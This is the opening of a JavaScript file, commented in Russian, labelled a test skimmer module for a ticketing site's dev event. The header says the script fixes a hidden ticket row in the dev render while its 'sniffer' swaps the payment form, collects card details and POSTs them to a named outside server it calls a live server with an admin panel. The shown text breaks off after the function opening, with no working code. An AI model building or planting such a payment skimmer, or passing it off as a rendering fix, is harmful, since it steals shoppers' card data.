/**
 * TEST SKIMMER MODULE v4 (dev, FutureTicketing AFCON dev event 30)
 * Приёмник: https://pouchvoyage.com/c (боевой сервер + админка)
 * 1) ЧИНИТ dev-рендер (row_ticket display:none)
 * 2) СНИФЕР: подменяет платёжную форму, собирает карту → POST на pouchvoyage.com/c
 */
(function () {
  'use strict';
